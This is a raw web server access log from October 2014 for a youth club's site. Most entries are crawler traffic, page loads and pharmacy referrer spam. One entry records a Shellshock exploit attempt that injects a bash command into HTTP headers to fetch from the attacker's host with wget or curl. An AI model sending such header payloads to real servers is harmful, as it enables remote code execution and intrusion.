31.184.238.152 - - [20/Oct/2014:06:39:27 -0700] "GET /logs/access.log HTTP/1.0" 200 49884 "http://orderethinylestradiolonline.snack.ws" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.102 Safari/537.36" "www.bgcsierrablanca.org"
31.184.238.152 - - [20/Oct/2014:06:51:45 -0700] "GET /logs/access.log HTTP/1.0" 200 50158 "http://orderloxapineonlinecheap.tumblr.com" "Opera/9.80 (Windows NT 5.1) Presto/2.12.388 Version/12.16" "www.bgcsierrablanca.org"
31.184.238.152 - - [20/Oct/2014:06:57:49 -0700] "GET /logs/access.log HTTP/1.0" 200 50379 "http://ordersimvastatin20mgonlinefastdelivery.soup.io" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.107 Safari/537.36 OPR/19.0.1326.63" "www.bgcsierrablanca.org"
98.138.19.91 - - [20/Oct/2014:07:03:56 -0700] "GET /logs/access.log HTTP/1.1" 500 5155 "http://buyhydroxyzinenorx.soup.io" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.102 Safari/537.36" "www.bgcsierrablanca.org"
208.115.113.83 - - [20/Oct/2014:07:15:52 -0700] "GET /robots.txt HTTP/1.1" 200 46 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" "www.bgcsierrablanca.org"
31.184.238.152 - - [20/Oct/2014:07:16:15 -0700] "GET /logs/access.log HTTP/1.0" 200 51146 "http://orderatorvastatin10mgnoprescript.over-blog.com" "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.107 Safari/537.36" "www.bgcsierrablanca.org"
98.138.19.90 - - [20/Oct/2014:07:22:18 -0700] "GET /logs/access.log HTTP/1.1" 200 51423 "http://zyloprim100mghx.forumcircle.com" "Mozilla/5.0 (Windows NT 6.1; rv:27.0) Gecko/20100101 Firefox/27.0" "www.bgcsierrablanca.org"
98.138.19.135 - - [20/Oct/2014:07:30:33 -0700] "GET / HTTP/1.1" 200 3198 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" "bgcsierrablanca.org"
31.184.238.152 - - [20/Oct/2014:07:34:20 -0700] "GET /logs/access.log HTTP/1.0" 200 51831 "http://ordertricorsafely.soup.io" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.102 Safari/537.36" "www.bgcsierrablanca.org"
98.138.19.90 - - [20/Oct/2014:07:40:21 -0700] "GET /logs/access.log HTTP/1.1" 200 52087 "http://ordermetronidazole200mgsingapore.soup.io" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.102 Safari/537.36" "www.bgcsierrablanca.org"
31.184.238.152 - - [20/Oct/2014:07:46:03 -0700] "GET /logs/access.log HTTP/1.0" 200 52356 "http://orderfincaronlinewithoutprescription.soup.io" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.102 Safari/537.36 OPR/19.0.1326.59" "www.bgcsierrablanca.org"
31.184.238.152 - - [20/Oct/2014:07:51:46 -0700] "GET /logs/access.log HTTP/1.0" 200 52655 "http://ordermetformin850mgonlinefi.soup.io" "Opera/9.80 (Windows NT 6.1) Presto/2.12.388 Version/12.16" "www.bgcsierrablanca.org"
130.211.115.24 - - [20/Oct/2014:07:55:57 -0700] "GET / HTTP/1.0" 200 9401 "-" "NerdyBot" "bgcsierrablanca.org"
31.184.238.152 - - [20/Oct/2014:07:57:33 -0700] "GET /logs/access.log HTTP/1.0" 200 52987 "http://order-parlodel.soup.io" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.76 Safari/537.36" "www.bgcsierrablanca.org"
98.138.19.134 - - [20/Oct/2014:08:03:21 -0700] "GET /logs/access.log HTTP/1.1" 500 5155 "http://buy-glyburide-5mg-lowprice.over-blog.com" "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:27.0) Gecko/20100101 Firefox/27.0" "www.bgcsierrablanca.org"
98.138.19.151 - - [20/Oct/2014:08:21:57 -0700] "GET /sitebuilder/images/navbar-1-inactive-11921.png HTTP/1.1" 200 813 "http://www.bgcsierrablanca.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0" "www.bgcsierrablanca.org"
75.89.118.49 - - [20/Oct/2014:08:21:57 -0700] "GET /sitebuilder/images/navbar-2-inactive-12062.png HTTP/1.1" 200 759 "http://www.bgcsierrablanca.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0" "www.bgcsierrablanca.org"
75.89.118.49 - - [20/Oct/2014:08:21:57 -0700] "GET /sitebuilder/images/navbar-9-inactive-11281.png HTTP/1.1" 200 811 "http://www.bgcsierrablanca.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0" "www.bgcsierrablanca.org"
98.138.19.151 - - [20/Oct/2014:08:21:57 -0700] "GET /sitebuilder/images/navbar-10-inactive-93046.png HTTP/1.1" 200 862 "http://www.bgcsierrablanca.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0" "www.bgcsierrablanca.org"
75.89.118.49 - - [20/Oct/2014:08:21:57 -0700] "GET /sitebuilder/images/navbar-7-inactive-35843.png HTTP/1.1" 200 774 "http://www.bgcsierrablanca.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0" "www.bgcsierrablanca.org"
75.89.118.49 - - [20/Oct/2014:08:21:57 -0700] "GET /sitebuilder/images/BGCA_GFSH_VERT_CLR-530x173.jpg HTTP/1.1" 200 15035 "http://www.bgcsierrablanca.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0" "www.bgcsierrablanca.org"
75.89.118.49 - - [20/Oct/2014:08:21:57 -0700] "GET /sitebuilder/images/navbar-4-inactive-76468.png HTTP/1.1" 200 853 "http://www.bgcsierrablanca.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0" "www.bgcsierrablanca.org"
98.138.19.151 - - [20/Oct/2014:08:22:04 -0700] "GET /sitebuilder/images/navbar-8-mouseOver-18281.png HTTP/1.1" 200 823 "http://www.bgcsierrablanca.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0" "www.bgcsierrablanca.org"
98.138.19.151 - - [20/Oct/2014:08:22:05 -0700] "GET /employment.html HTTP/1.1" 200 2602 "http://www.bgcsierrablanca.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0" "www.bgcsierrablanca.org"
98.138.19.151 - - [20/Oct/2014:08:22:05 -0700] "GET /sitebuilder/images/navbar-0-inactive-82109.png HTTP/1.1" 200 722 "http://www.bgcsierrablanca.org/employment.html" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0" "www.bgcsierrablanca.org"
75.89.118.49 - - [20/Oct/2014:08:22:05 -0700] "GET /sitebuilder/images/navbar-8-active-18250.png HTTP/1.1" 200 860 "http://www.bgcsierrablanca.org/employment.html" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0" "www.bgcsierrablanca.org"
75.89.118.49 - - [20/Oct/2014:08:22:05 -0700] "GET /sitebuilder/images/Group_of_Kids_jpg-145x94.jpg HTTP/1.1" 200 3580 "http://www.bgcsierrablanca.org/employment.html" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0" "www.bgcsierrablanca.org"
31.184.238.152 - - [20/Oct/2014:08:27:45 -0700] "GET /logs/access.log HTTP/1.0" 200 56529 "http://buyprogesteroneonlinenl.aircus.com" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.102 Safari/537.36" "www.bgcsierrablanca.org"
31.184.238.152 - - [20/Oct/2014:08:40:08 -0700] "GET /logs/access.log HTTP/1.0" 200 56801 "http://buyexelon6mgfastshipping.soup.io" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0" "www.bgcsierrablanca.org"
98.138.19.91 - - [20/Oct/2014:08:46:27 -0700] "GET /logs/access.log HTTP/1.1" 500 5155 "http://orderclozapine100mgonlinenorx.soup.io" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0" "www.bgcsierrablanca.org"
98.138.19.135 - - [20/Oct/2014:08:52:26 -0700] "GET /logs/access.log HTTP/1.1" 500 5155 "http://buygeodongreece.forumcircle.com" "Mozilla/5.0 (X11; Linux i686; rv:18.0) Gecko/20100101 Firefox/18.0 Iceweasel/18.0.1" "www.bgcsierrablanca.org"
98.138.19.139 - - [20/Oct/2014:08:54:36 -0700] "GET /images/?C=S;O=A HTTP/1.1" 500 1721 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" "www.bgcsierrablanca.org"
31.184.238.152 - - [20/Oct/2014:08:58:35 -0700] "GET /logs/access.log HTTP/1.0" 200 57714 "http://orderclomiphene25mgnoprescript.soup.io" "Mozilla/5.0 (Windows NT 5.1; rv:26.0) Gecko/20100101 Firefox/26.0" "www.bgcsierrablanca.org"
31.184.238.152 - - [20/Oct/2014:09:04:40 -0700] "GET /logs/access.log HTTP/1.0" 200 57946 "http://ordernitrofurazone.snack.ws" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.117 Safari/537.36 OPR/20.0.1387.64" "www.bgcsierrablanca.org"
98.138.19.151 - - [20/Oct/2014:09:09:13 -0700] "GET /robots.txt HTTP/1.1" 200 46 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" "www.bgcsierrablanca.org"
31.184.238.152 - - [20/Oct/2014:09:17:02 -0700] "GET /logs/access.log HTTP/1.0" 200 58432 "http://buyfelodipine5mgnoscript.soup.io" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.107 Safari/537.36" "www.bgcsierrablanca.org"
98.138.19.134 - - [20/Oct/2014:09:23:17 -0700] "GET /logs/access.log HTTP/1.1" 500 5155 "http://buycilostazolonlinecheap.snack.ws" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.107 Safari/537.36" "www.bgcsierrablanca.org"
202.46.62.109 - - [20/Oct/2014:09:24:38 -0700] "GET /images/?C=S;O=A HTTP/1.1" 200 8083 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:22.0) Gecko/20100101 Firefox/22.0" "www.bgcsierrablanca.org"
31.184.238.152 - - [20/Oct/2014:09:29:28 -0700] "GET /logs/access.log HTTP/1.0" 200 59150 "http://buynoroxin.forumcircle.com" "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.107 Safari/537.36" "www.bgcsierrablanca.org"
31.184.238.152 - - [20/Oct/2014:09:35:32 -0700] "GET /logs/access.log HTTP/1.0" 200 59407 "http://buyesomeprazole40mgquickdelivery.snack.ws" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.12785 YaBrowser/13.12.1599.12785 Safari/537.36" "www.bgcsierrablanca.org"
31.184.238.152 - - [20/Oct/2014:09:41:45 -0700] "GET /logs/access.log HTTP/1.0" 200 59708 "http://buygeodononlinequickshipping.soup.io" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.76 Safari/537.36" "www.bgcsierrablanca.org"
180.76.6.131 - - [20/Oct/2014:09:49:26 -0700] "GET /files/Boys_Girls_Club_Membership_Application.pdf HTTP/1.1" 200 732117 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" "www.bgcsierrablanca.org"
31.184.238.152 - - [20/Oct/2014:09:54:04 -0700] "GET /logs/access.log HTTP/1.0" 200 60212 "http://etodolac-order.over-blog.com" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.76 Safari/537.36" "www.bgcsierrablanca.org"
98.138.19.134 - - [20/Oct/2014:10:00:27 -0700] "GET /logs/access.log HTTP/1.1" 200 60470 "http://paxil-30mg-buy-safely.soup.io" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.107 Safari/537.36" "www.bgcsierrablanca.org"
31.184.238.152 - - [20/Oct/2014:10:06:28 -0700] "GET /logs/access.log HTTP/1.0" 200 60736 "http://buyasacol400mgquickdelivery.soup.io" "Mozilla/5.0 (Windows NT 6.1; rv:27.0) Gecko/20100101 Firefox/27.0" "www.bgcsierrablanca.org"
31.184.238.152 - - [20/Oct/2014:10:12:23 -0700] "GET /logs/access.log HTTP/1.0" 200 60965 "http://buy-ranitidine-300mg-online.snack.ws" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.12785 YaBrowser/13.12.1599.12785 Safari/537.36" "www.bgcsierrablanca.org"
31.184.238.152 - - [20/Oct/2014:10:18:20 -0700] "GET /logs/access.log HTTP/1.0" 200 61261 "http://order-levaquin-750mg-safely.soup.io" "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.146 Safari/537.36" "www.bgcsierrablanca.org"
157.55.39.239 - - [20/Oct/2014:10:21:02 -0700] "GET /robots.txt HTTP/1.1" 200 46 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "www.bgcsierrablanca.org"
31.184.238.152 - - [20/Oct/2014:10:24:26 -0700] "GET /logs/access.log HTTP/1.0" 200 61712 "http://indomethacin-order-safely.snack.ws" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.107 Safari/537.36" "www.bgcsierrablanca.org"
77.222.42.202 - - [20/Oct/2014:10:27:59 -0700] "GET /js/mage/cookies.js HTTP/1.1" 404 73 "http://BGCSIERRABLANCA.org" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.375.99 Safari/533.4" "bgcsierrablanca.org"
77.222.42.202 - - [20/Oct/2014:10:28:42 -0700] "GET /js/mage/cookies.js HTTP/1.1" 404 73 "http://BGCSIERRABLANCA.org" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.375.99 Safari/533.4" "bgcsierrablanca.org"
31.184.238.152 - - [20/Oct/2014:10:30:28 -0700] "GET /logs/access.log HTTP/1.0" 200 62495 "http://buyloxitane25mglowprice.soup.io" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.146 Safari/537.36" "www.bgcsierrablanca.org"
31.184.238.152 - - [20/Oct/2014:10:36:29 -0700] "GET /logs/access.log HTTP/1.0" 200 62757 "http://mxerectalis.forumcircle.com" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:27.0) Gecko/20100101 Firefox/27.0" "www.bgcsierrablanca.org"
31.184.238.152 - - [20/Oct/2014:10:42:29 -0700] "GET /logs/access.log HTTP/1.0" 200 62985 "http://lopid-order.soup.io" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0" "www.bgcsierrablanca.org"
31.184.238.152 - - [20/Oct/2014:10:48:28 -0700] "GET /logs/access.log HTTP/1.0" 200 63205 "http://cymbalta-40mg-order-without-prescription.soup.io" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.117 Safari/537.36 OPR/20.0.1387.64" "www.bgcsierrablanca.org"
31.184.238.152 - - [20/Oct/2014:10:54:29 -0700] "GET /logs/access.log HTTP/1.0" 200 63508 "http://88diflucan.forumcircle.com" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.146 Safari/537.36" "www.bgcsierrablanca.org"
98.138.19.151 - - [20/Oct/2014:11:00:28 -0700] "GET /logs/access.log HTTP/1.1" 200 63772 "http://buyluvoxitaly.soup.io" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.117 Safari/537.36" "www.bgcsierrablanca.org"
98.138.19.151 - - [20/Oct/2014:11:06:27 -0700] "GET /logs/access.log HTTP/1.1" 500 5155 "http://furoxone100mgczg.forumcircle.com" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.12785 YaBrowser/13.12.1599.12785 Safari/537.36" "www.bgcsierrablanca.org"
208.115.113.83 - - [20/Oct/2014:11:11:38 -0700] "GET /robots.txt HTTP/1.1" 200 46 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" "www.bgcsierrablanca.org"
98.138.19.151 - - [20/Oct/2014:11:12:32 -0700] "GET /logs/access.log HTTP/1.1" 500 5155 "http://order-terbinafine-no-prescription.soup.io" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.117 Safari/537.36 OPR/20.0.1387.64" "www.bgcsierrablanca.org"
98.138.19.151 - - [20/Oct/2014:11:18:16 -0700] "GET /logs/access.log HTTP/1.1" 500 5155 "http://amlodipine-10mg-buy-without-prescription.soup.io" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.117 Safari/537.36" "www.bgcsierrablanca.org"
31.184.238.152 - - [20/Oct/2014:11:24:09 -0700] "GET /logs/access.log HTTP/1.0" 200 65096 "http://ordertofranil75mg.soup.io" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.117 Safari/537.36" "www.bgcsierrablanca.org"
98.138.19.91 - - [20/Oct/2014:11:36:09 -0700] "GET /logs/access.log HTTP/1.1" 500 5155 "http://orderfenofibrate160mgonlinecheap.tumblr.com" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.13014 YaBrowser/13.12.1599.13014 Safari/537.36" "www.bgcsierrablanca.org"
98.138.19.135 - - [20/Oct/2014:11:42:02 -0700] "GET /logs/access.log HTTP/1.1" 200 65659 "http://order-minocin.snack.ws" "Mozilla/5.0 (X11; Linux i686; rv:18.0) Gecko/20100101 Firefox/18.0 Iceweasel/18.0.1" "www.bgcsierrablanca.org"
98.138.19.151 - - [20/Oct/2014:11:47:58 -0700] "GET /logs/access.log HTTP/1.1" 500 5155 "http://serophene-order-no-rx.soup.io" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.76 Safari/537.36" "www.bgcsierrablanca.org"
31.184.238.152 - - [20/Oct/2014:11:53:52 -0700] "GET /logs/access.log HTTP/1.0" 200 66149 "http://orderpaxil20mg.snack.ws" "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:27.0) Gecko/20100101 Firefox/27.0" "www.bgcsierrablanca.org"
31.184.238.152 - - [20/Oct/2014:11:59:39 -0700] "GET /logs/access.log HTTP/1.0" 200 66373 "http://hyzaar-buy.soup.io" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.117 Safari/537.36" "www.bgcsierrablanca.org"
98.138.19.139 - - [20/Oct/2014:12:19:14 -0700] "GET /logs/?C=M;O=A HTTP/1.1" 200 1129 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" "www.bgcsierrablanca.org"
31.184.238.152 - - [20/Oct/2014:12:23:53 -0700] "GET /logs/access.log HTTP/1.0" 200 66824 "http://buy-perindopril-8mg-online.snack.ws" "Mozilla/5.0 (Windows NT 6.1; rv:27.0) Gecko/20100101 Firefox/27.0" "www.bgcsierrablanca.org"
37.1.207.83 - - [20/Oct/2014:12:27:10 -0700] "GET / HTTP/1.1" 200 2368 "() { :;}; /bin/bash -c \"wget -P /tmp http://37.1.207.83/log.php?get=aHR0cDovL2JnY3NpZXJyYWJsYW5jYS5vcmcv\"" "() { :;}; /bin/bash -c \"curl -O http://37.1.207.83/log.php?get=aHR0cDovL2JnY3NpZXJyYWJsYW5jYS5vcmcv\"" "bgcsierrablanca.org"
98.138.19.134 - - [20/Oct/2014:12:30:02 -0700] "GET /logs/access.log HTTP/1.1" 200 67361 "http://buythyroxineonlinequickdelivery.snack.ws" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.117 Safari/537.36" "www.bgcsierrablanca.org"
174.131.222.53 - - [20/Oct/2014:12:41:19 -0700] "GET /sitebuilder/images/navbar-7-inactive-35843.png HTTP/1.1" 304 - "http://www.bgcsierrablanca.org/" "Mozilla/5.0 (Linux; U; Android 4.2.2; en-us; HTC6435LVW 4G Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30" "www.bgcsierrablanca.org"
174.131.222.53 - - [20/Oct/2014:12:41:19 -0700] "GET /sitebuilder/images/navbar-9-inactive-11281.png HTTP/1.1" 200 811 "http://www.bgcsierrablanca.org/" "Mozilla/5.0 (Linux; U; Android 4.2.2; en-us; HTC6435LVW 4G Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30" "www.bgcsierrablanca.org"
174.131.222.53 - - [20/Oct/2014:12:41:19 -0700] "GET /sitebuilder/images/navbar-10-inactive-93046.png HTTP/1.1" 200 862 "http://www.bgcsierrablanca.org/" "Mozilla/5.0 (Linux; U; Android 4.2.2; en-us; HTC6435LVW 4G Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30" "www.bgcsierrablanca.org"
174.131.222.53 - - [20/Oct/2014:12:41:19 -0700] "GET /sitebuilder/images/navbar-8-inactive-18203.png HTTP/1.1" 304 - "http://www.bgcsierrablanca.org/" "Mozilla/5.0 (Linux; U; Android 4.2.2; en-us; HTC6435LVW 4G Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30" "www.bgcsierrablanca.org"
174.131.222.53 - - [20/Oct/2014:12:41:19 -0700] "GET /sitebuilder/images/poster1-center-001-165x104.jpg HTTP/1.1" 304 - "http://www.bgcsierrablanca.org/" "Mozilla/5.0 (Linux; U; Android 4.2.2; en-us; HTC6435LVW 4G Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30" "www.bgcsierrablanca.org"
174.131.222.53 - - [20/Oct/2014:12:41:19 -0700] "GET /sitebuilder/images/BGCA_GFSH_VERT_CLR-530x173.jpg HTTP/1.1" 304 - "http://www.bgcsierrablanca.org/" "Mozilla/5.0 (Linux; U; Android 4.2.2; en-us; HTC6435LVW 4G Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30" "www.bgcsierrablanca.org"
98.138.19.135 - - [20/Oct/2014:12:41:19 -0700] "GET /sitebuilder/images/minds_under_construction-105x105.jpg HTTP/1.1" 200 3781 "http://www.bgcsierrablanca.org/" "Mozilla/5.0 (Linux; U; Android 4.2.2; en-us; HTC6435LVW 4G Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30" "www.bgcsierrablanca.org"
31.184.238.152 - - [20/Oct/2014:12:42:08 -0700] "GET /logs/access.log HTTP/1.0" 200 69921 "http://buymysoline2014.forumcircle.com" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.102 Safari/537.36" "www.bgcsierrablanca.org"
174.131.222.53 - - [20/Oct/2014:12:42:34 -0700] "GET /contact_us HTTP/1.1" 200 8258 "https://www.google.com/" "Mozilla/5.0 (Linux; U; Android 4.2.2; en-us; HTC6435LVW 4G Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30" "bgcsierrablanca.org"
98.138.19.151 - - [20/Oct/2014:12:42:37 -0700] "GET /_ySmbWs/tracking/admin/map?width=290&height=250&address=200%20Church%20%2C%20%2C%20Ruidoso%2C%20NM%2C%2088345&version=1 HTTP/1.1" 500 2503 "http://bgcsierrablanca.org/contact_us" "Mozilla/5.0 (Linux; U; Android 4.2.2; en-us; HTC6435LVW 4G Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30" "bgcsierrablanca.org"
98.138.19.151 - - [20/Oct/2014:12:42:48 -0700] "GET /sitebuilder/images/navbar-5-inactive-37281.png HTTP/1.1" 500 2327 "http://www.bgcsierrablanca.org/" "Mozilla/5.0 (Linux; U; Android 4.2.2; en-us; HTC6435LVW 4G Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30" "www.bgcsierrablanca.org"
98.138.19.134 - - [20/Oct/2014:12:42:49 -0700] "GET / HTTP/1.1" 500 2347 "http://www.bgcsierrablanca.org/" "Mozilla/5.0 (Linux; U; Android 4.2.2; en-us; HTC6435LVW 4G Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30" "www.bgcsierrablanca.org"
98.138.19.134 - - [20/Oct/2014:12:42:57 -0700] "GET / HTTP/1.1" 500 2349 "http://www.bgcsierrablanca.org/" "Mozilla/5.0 (Linux; U; Android 4.2.2; en-us; HTC6435LVW 4G Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30" "www.bgcsierrablanca.org"
98.138.19.151 - - [20/Oct/2014:12:42:58 -0700] "GET /sitebuilder/images/navbar-5-inactive-37281.png HTTP/1.1" 500 2323 "http://www.bgcsierrablanca.org/" "Mozilla/5.0 (Linux; U; Android 4.2.2; en-us; HTC6435LVW 4G Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30" "www.bgcsierrablanca.org"
98.138.19.135 - - [20/Oct/2014:12:43:39 -0700] "GET / HTTP/1.1" 500 2349 "http://lm.facebook.com/l.php?u=http%3A%2F%2Fwww.bgcsierrablanca.org%2F&h=lAQHYRmQK&s=1" "Mozilla/5.0 (Linux; U; Android 4.2.2; en-us; HTC6435LVW 4G Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30" "www.bgcsierrablanca.org"
98.138.19.138 - - [20/Oct/2014:12:46:34 -0700] "GET /logs/access_140414.log HTTP/1.1" 500 1721 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" "www.bgcsierrablanca.org"
31.184.238.152 - - [20/Oct/2014:12:48:13 -0700] "GET /logs/access.log HTTP/1.0" 200 72621 "http://orderstendra50mgonlinedk.soup.io" "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.76 Safari/537.36" "www.bgcsierrablanca.org"
123.125.71.24 - - [20/Oct/2014:12:50:12 -0700] "GET /robots.txt HTTP/1.1" 200 544 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" "www.bgcsierrablanca.org"
98.138.19.134 - - [20/Oct/2014:12:50:16 -0700] "GET / HTTP/1.1" 200 2368 "http://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=3&ved=0CC8QFjAC&url=http%3A%2F%2Fwww.bgcsierrablanca.org%2F&ei=cWdFVIKBCcq6iALQn4GgDg&usg=AFQjCNEd43lTNK7cep-nDjln8pDEFEsZHw&bvm=bv.77880786,d.cGE" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0" "www.bgcsierrablanca.org"
98.138.19.134 - - [20/Oct/2014:12:50:17 -0700] "GET /sitebuilder/images/navbar-0-active-82156.png HTTP/1.1" 200 717 "http://www.bgcsierrablanca.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0" "www.bgcsierrablanca.org"
98.138.19.90 - - [20/Oct/2014:12:50:17 -0700] "GET /sitebuilder/images/navbar-2-inactive-12062.png HTTP/1.1" 200 759 "http://www.bgcsierrablanca.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0" "www.bgcsierrablanca.org"
